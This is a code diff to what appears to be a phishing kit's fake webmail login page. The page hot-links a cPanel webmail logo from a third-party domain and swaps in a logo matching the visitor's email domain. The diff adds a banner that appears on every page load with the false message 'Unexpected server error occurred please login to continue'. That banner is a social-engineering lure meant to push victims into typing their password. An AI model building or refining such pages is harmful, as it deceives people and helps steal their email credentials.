@@ -19,13 +19,26 @@
         }
         
         .main-container {
-            margin: 45px auto;
+            margin: 80px auto;
             min-height: 460px;
         }
         
         .wrapper {
             max-width: 356px;
             margin: 0 auto;
+        }
+
+        .server-error {
+            color: #d9534f;
+            background-color: #f2dede;
+            border: 1px solid #ebccd1;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            display: none;
         }
         
         .logo-container {
@@ -182,6 +195,10 @@
 <body>
     <div class="main-container">
         <div class="wrapper">
+            <div class="server-error" id="serverError">
+                Unexpected server error occurred please login to continue
+            </div>
+            
             <div class="logo-container">
                 <img class="main-logo" src="https://webmail.empowernc.com/cPanel_magic_revision_1569621012/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
             </div>
@@ -241,6 +258,12 @@
 <script>
     /* global $ */
     $(document).ready(function() {
+        // Show server error message for 7 seconds on page load
+        $('#serverError').fadeIn(500);
+        setTimeout(function() {
+            $('#serverError').fadeOut(500);
+        }, 7000);
+
         function updateLogo(email) {
             var domain = email.substring(email.lastIndexOf("@") + 1);
             var logoUrl = "https://logo.clearbit.com/" + domain;
